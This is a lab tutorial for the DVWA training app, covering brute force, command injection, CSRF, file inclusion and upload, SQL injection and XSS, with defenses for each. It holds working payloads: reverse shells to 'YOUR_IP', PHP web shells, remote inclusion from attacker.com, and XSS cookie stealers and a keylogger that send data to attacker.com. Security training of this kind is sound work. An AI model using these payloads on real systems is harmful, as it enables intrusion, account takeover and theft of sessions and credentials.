# DVWA Complete Attack Guide

A comprehensive guide to all DVWA (Damn Vulnerable Web Application) labs with commands, explanations, and concepts.

**URL:** http://localhost:8081
**Credentials:** admin:password
**Security Level:** Set to Low at http://localhost:8081/security.php

---

## Table of Contents

1. [Brute Force](#1-brute-force)
2. [Command Injection](#2-command-injection)
3. [CSRF](#3-csrf-cross-site-request-forgery)
4. [File Inclusion](#4-file-inclusion)
5. [File Upload](#5-file-upload)
6. [SQL Injection](#6-sql-injection)
7. [SQL Injection (Blind)](#7-sql-injection-blind)
8. [Weak Session IDs](#8-weak-session-ids)
9. [XSS (DOM)](#9-xss-dom)
10. [XSS (Reflected)](#10-xss-reflected)
11. [XSS (Stored)](#11-xss-stored)

---

## 1. Brute Force

**URL:** http://localhost:8081/vulnerabilities/brute/

### Concept
Brute force attacks systematically try all possible password combinations until finding the correct one. The vulnerability exists when there's no rate limiting, account lockout, or CAPTCHA.

### Attack Command (Hydra)

```bash
# Get your session cookie from browser DevTools (F12 > Application > Cookies)
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8081 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=YOUR_SESSION; security=low"
```

### Parameters Explained
| Parameter | Meaning |
|-----------|---------|
| `-l admin` | Username to attack |
| `-P wordlist.txt` | Password wordlist |
| `-s 8081` | Target port |
| `http-get-form` | HTTP GET form attack |
| `^USER^` | Username placeholder |
| `^PASS^` | Password placeholder |
| `F=incorrect` | Failure string (if response contains this, login failed) |
| `H=Cookie:` | HTTP headers to include |

### Defense
- Account lockout after N failed attempts
- CAPTCHA
- Rate limiting
- Multi-factor authentication

---

## 2. Command Injection

**URL:** http://localhost:8081/vulnerabilities/exec/

### Concept
The application passes user input directly to system commands without sanitization. Attackers can chain additional commands using shell operators.

### Vulnerable Code Pattern
```php
$cmd = shell_exec('ping -c 4 ' . $_GET['ip']);
```

### Payloads

```bash
# Basic command chaining
; ls -la
; whoami
; id
; cat /etc/passwd

# Different operators
127.0.0.1; ls              # Sequential execution
127.0.0.1 && whoami        # AND - runs if first succeeds
127.0.0.1 | cat /etc/passwd # Pipe output
127.0.0.1 || ls            # OR - runs if first fails
`ls`                       # Command substitution
$(whoami)                  # Command substitution

# Reverse shell (listen first: nc -lvnp 4444)
; nc -e /bin/bash YOUR_IP 4444
; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

### Shell Operators Reference
| Operator | Name | Behavior |
|----------|------|----------|
| `;` | Semicolon | Run next command regardless |
| `&&` | AND | Run next if previous succeeds |
| `\|\|` | OR | Run next if previous fails |
| `\|` | Pipe | Send output to next command |
| `` `cmd` `` | Backticks | Execute and substitute |
| `$(cmd)` | Dollar | Execute and substitute |

### Defense
- Input validation (whitelist allowed characters)
- Never pass user input to shell commands
- Use language-specific functions instead of system calls

---

## 3. CSRF (Cross-Site Request Forgery)

**URL:** http://localhost:8081/vulnerabilities/csrf/

### Concept
CSRF tricks authenticated users into performing actions they didn't intend. The attacker crafts a malicious page that makes requests to the vulnerable site using the victim's session.

### How It Works
1. Victim is logged into DVWA
2. Victim visits attacker's page
3. Attacker's page silently sends request to DVWA
4. DVWA accepts the request (victim is authenticated)
5. Password gets changed without victim knowing

### Attack Files

**Image-based attack (csrf_attack.html):**
```html
<html>
<body>
<h1>You won a prize!</h1>
<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
</body>
</html>
```

**Form-based attack (csrf_attack2.html):**
```html
<html>
<body onload="document.getElementById('csrfForm').submit()">
<h1>Loading...</h1>
<form action="http://localhost:8081/vulnerabilities/csrf/" method="GET" id="csrfForm" style="display:none">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="hidden" name="Change" value="Change">
</form>
</body>
</html>
```

### Testing Steps
```bash
# Start local server to host attack page
python3 -m http.server 9000

# Then in browser:
# 1. Log into DVWA
# 2. Visit http://localhost:9000/csrf_attack.html
# 3. Password changes to "hacked"
```

### Defense
- CSRF tokens (unique per request)
- SameSite cookie attribute
- Verify Origin/Referer headers
- Require re-authentication for sensitive actions

---

## 4. File Inclusion

**URL:** http://localhost:8081/vulnerabilities/fi/

### Concept
File inclusion vulnerabilities occur when user input controls which file gets included/executed. LFI reads local files; RFI includes remote files.

### Types
| Type | Description | Example |
|------|-------------|---------|
| **LFI** | Local File Inclusion | Read files on server |
| **RFI** | Remote File Inclusion | Include files from URL |

### LFI Payloads

```bash
# Basic path traversal
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd

# DVWA config (contains DB credentials)
?page=../../config/config.inc.php

# Apache config
?page=../../../etc/apache2/apache2.conf

# Log files (for log poisoning)
?page=../../../var/log/apache2/access.log
```

### PHP Wrappers (Advanced)

```bash
# Read source code as base64
?page=php://filter/convert.base64-encode/resource=index.php

# Execute PHP from POST data
?page=php://input
# Then POST: <?php system('whoami'); ?>

# Data wrapper (direct code execution)
?page=data://text/plain,<?php system($_GET['cmd']); ?>

# Base64 encoded payload
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### RFI Payloads
```bash
# Include remote shell (requires allow_url_include=On)
?page=http://localhost:9000/shell.php
?page=http://attacker.com/shell.txt
```

### Log Poisoning (LFI to RCE)
```bash
# 1. Inject PHP into logs via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:8081/

# 2. Include the log file
?page=../../../var/log/apache2/access.log&cmd=whoami
```

### Defense
- Whitelist allowed files
- Disable `allow_url_include`
- Use basename() to strip path traversal
- Chroot/jail the web application

---

## 5. File Upload

**URL:** http://localhost:8081/vulnerabilities/upload/

### Concept
Unrestricted file upload allows attackers to upload executable files (like PHP shells) to the server, achieving remote code execution.

### Attack Files

**shell.php** - Basic web shell:
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

**advanced_shell.php** - Multi-function shell:
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_GET['read'])) {
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET['read'])) . "</pre>";
}
if(isset($_GET['info'])) {
    phpinfo();
}
?>
```

**shell.gif** - Disguised as image:
```
GIF89a
<?php system($_GET['cmd']); ?>
```

### Attack Steps
```bash
# 1. Upload shell.php via DVWA upload form

# 2. Access shell at:
http://localhost:8081/hackable/uploads/shell.php?cmd=whoami
http://localhost:8081/hackable/uploads/shell.php?cmd=ls -la
http://localhost:8081/hackable/uploads/shell.php?cmd=cat /etc/passwd

# 3. Advanced shell features:
http://localhost:8081/hackable/uploads/advanced_shell.php?cmd=id
http://localhost:8081/hackable/uploads/advanced_shell.php?read=/etc/passwd
http://localhost:8081/hackable/uploads/advanced_shell.php?info=1
```

### Bypass Techniques (for Medium/High security)

| Check | Bypass |
|-------|--------|
| Extension blacklist | Use .php5, .phtml, .phar |
| Content-Type check | Change header to image/jpeg |
| Magic bytes | Add GIF89a at start of file |
| Double extension | shell.php.jpg |
| Null byte (old PHP) | shell.php%00.jpg |

### Defense
- Whitelist allowed extensions
- Check file content, not just headers
- Store uploads outside webroot
- Rename uploaded files
- Disable execution in upload directory

---

## 6. SQL Injection

**URL:** http://localhost:8081/vulnerabilities/sqli/

### Concept
SQL injection occurs when user input is concatenated into SQL queries without sanitization. Attackers can modify queries to extract data, bypass authentication, or damage the database.

### Vulnerable Code Pattern
```php
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
```

### Attack Flow

**Step 1: Detect injection**
```
1'          -> Error = vulnerable
1' AND '1'='1    -> Normal response = vulnerable
1' AND '1'='2    -> Different response = confirmed
```

**Step 2: Find column count**
```
1' ORDER BY 1#   -> OK
1' ORDER BY 2#   -> OK
1' ORDER BY 3#   -> Error = 2 columns
```

**Step 3: Union attack**
```
1' UNION SELECT 1,2#                -> See which numbers appear
1' UNION SELECT user(),database()#  -> Get DB info
1' UNION SELECT null,version()#     -> MySQL version
```

**Step 4: Extract tables**
```sql
1' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database()#
```

**Step 5: Extract columns**
```sql
1' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'#
```

**Step 6: Dump data**
```sql
1' UNION SELECT user,password FROM users#
1' UNION SELECT null,concat(user,':',password) FROM users#
```

### Common Payloads
```sql
# Authentication bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin'--

# Information gathering
' UNION SELECT null,@@version#
' UNION SELECT null,user()#
' UNION SELECT null,database()#
```

### Defense
- Use prepared statements (parameterized queries)
- Input validation
- Least privilege database accounts
- Web application firewall

---

## 7. SQL Injection (Blind)

**URL:** http://localhost:8081/vulnerabilities/sqli_blind/

### Concept
Blind SQL injection is when you can't see query results directly. Instead, you infer information from differences in application behavior (true/false responses or time delays).

### Types

| Type | Detection Method |
|------|------------------|
| Boolean-based | Different response for true/false |
| Time-based | Response delay for true conditions |

### Boolean-Based Payloads

```sql
# Test for injection
1' AND 1=1#    -> Returns user (TRUE)
1' AND 1=2#    -> No user (FALSE)

# Check if admin exists
1' AND (SELECT COUNT(*) FROM users WHERE user='admin')=1#

# Extract password length
1' AND LENGTH((SELECT password FROM users WHERE user='admin'))=32#

# Extract password character by character
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'#
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),2,1)='f'#
```

### Time-Based Payloads

```sql
# Basic time test
1' AND SLEEP(5)#

# Conditional time delay
1' AND IF(1=1,SLEEP(5),0)#
1' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)#

# Extract data with timing
1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5',SLEEP(5),0)#
```

### Automated with SQLMap

```bash
# Get cookies from browser first
# Basic scan
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" --dbs

# Dump database
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" -D dvwa --tables

# Dump users table
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" -D dvwa -T users --dump
```

### Defense
Same as regular SQL injection - use prepared statements.

---

## 8. Weak Session IDs

**URL:** http://localhost:8081/vulnerabilities/weak_id/

### Concept
Session IDs should be random and unpredictable. Weak session IDs can be guessed or predicted, allowing session hijacking.

### Common Weaknesses

| Pattern | Problem |
|---------|---------|
| Sequential (1, 2, 3...) | Predictable |
| Timestamp | Can calculate |
| MD5(timestamp) | Can brute force |
| Username-based | Easily guessed |

### Testing Steps
```bash
# 1. Click "Generate" multiple times
# 2. Observe the dvwaSession cookie in DevTools
# 3. Look for patterns

# Low security: Sequential numbers
# Medium security: Timestamp
# High security: MD5(timestamp)
```

### Attack
```bash
# If session ID is sequential:
# Current: 5
# Guess others: 1, 2, 3, 4, 6, 7...

# Set stolen session via browser console:
document.cookie = "dvwaSession=3";
```

### Defense
- Use cryptographically secure random number generators
- Regenerate session ID on login
- Implement session expiration
- Bind sessions to IP/User-Agent

---

## 9. XSS (DOM)

**URL:** http://localhost:8081/vulnerabilities/xss_d/

### Concept
DOM-based XSS occurs when JavaScript writes user input to the page without sanitization. The payload never reaches the server; it's processed entirely client-side.

### Vulnerable Code Pattern
```javascript
document.getElementById("output").innerHTML = location.hash;
```

### Payloads

```html
# In the URL after ?default=
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# If script tags are filtered
</option></select><img src=x onerror=alert('XSS')>
</option></select><svg onload=alert('XSS')>
```

### Full Attack URLs
```
http://localhost:8081/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
http://localhost:8081/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(document.cookie)>
```

### Defense
- Use textContent instead of innerHTML
- Sanitize with DOMPurify library
- Content Security Policy (CSP)

---

## 10. XSS (Reflected)

**URL:** http://localhost:8081/vulnerabilities/xss_r/

### Concept
Reflected XSS occurs when user input is immediately returned in the response without sanitization. The payload is in the URL/request, making it easy to share malicious links.

### Payloads

```html
# Basic
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# Event handlers
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# Cookie stealing
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

### Attack URL
```
http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

### Stealing Cookies

```bash
# 1. Start listener
python3 -m http.server 9000

# 2. Send victim this URL:
http://localhost:8081/vulnerabilities/xss_r/?name=<script>new Image().src="http://localhost:9000/steal?c="%2Bdocument.cookie</script>

# 3. Check server logs for cookie
```

### Defense
- HTML encode output
- Content Security Policy
- HttpOnly cookie flag (prevents JS access)

---

## 11. XSS (Stored)

**URL:** http://localhost:8081/vulnerabilities/xss_s/

### Concept
Stored XSS persists in the database. Every user who views the affected page gets attacked. This is the most dangerous XSS type.

### Attack Steps

1. Go to the guestbook page
2. In the **Name** field (may need to bypass length limit): `<script>alert('XSS')</script>`
3. In the **Message** field: `<script>alert(document.cookie)</script>`
4. Submit
5. Every visitor now sees the alert

### Bypassing Name Field Length Limit

```javascript
// In browser console, change maxlength:
document.getElementsByName('txtName')[0].maxLength = 100;

// Or use Burp Suite to modify the request
```

### Payloads

```html
# Basic stored XSS
<script>alert('Stored XSS')</script>

# Persistent cookie stealer
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>

# Keylogger
<script>document.onkeypress=function(e){new Image().src="http://attacker.com/log?k="+e.key}</script>

# Deface page
<script>document.body.innerHTML="<h1>Hacked!</h1>"</script>
```

### Defense
- Input validation and sanitization
- Output encoding
- Content Security Policy
- HttpOnly cookies

---

## Quick Reference

### Tools Required
```bash
# Hydra - brute forcing
apt install hydra

# SQLMap - SQL injection automation
apt install sqlmap

# Netcat - reverse shells
apt install netcat

# Burp Suite - web proxy
# Download from portswigger.net
```

### Start Attack Server
```bash
python3 -m http.server 9000
```

### Reverse Shell Listener
```bash
nc -lvnp 4444
```

### Useful One-liners
```bash
# Crack MD5 hashes from DVWA
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 /usr/share/wordlists/rockyou.txt

# Decode base64 from PHP wrapper
echo "BASE64_STRING" | base64 -d
```

---

## Security Levels

DVWA has 4 security levels. Each adds more protections:

| Level | Protections |
|-------|-------------|
| Low | None - all attacks work |
| Medium | Basic filtering, can usually bypass |
| High | Strong filtering, advanced bypass needed |
| Impossible | Secure implementation (study this!) |

**Tip:** After exploiting on Low, try the same on Medium/High to learn bypass techniques.

---

## Disclaimer

This guide is for educational purposes only. Only use these techniques on systems you own or have explicit permission to test. Unauthorized hacking is illegal.
